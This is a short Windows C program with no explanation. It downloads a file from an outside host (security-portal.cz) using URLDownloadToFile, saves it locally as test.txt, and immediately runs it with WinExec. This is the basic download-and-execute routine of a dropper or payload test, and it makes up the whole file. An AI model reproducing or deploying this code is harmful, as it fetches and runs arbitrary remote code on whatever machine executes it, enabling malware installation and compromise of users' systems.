# include <windows.h>


void
main(void)
{
  HRESULT error = URLDownloadToFile(NULL,
                                    "http://bflow.security-portal.cz/down/xy.txt",
                                    ".\\test.txt",
                                    0,
                                    NULL);
  if (error != S_OK) {
    return;
  }

  WinExec(".\\test.txt", SW_SHOW);

  return;
}
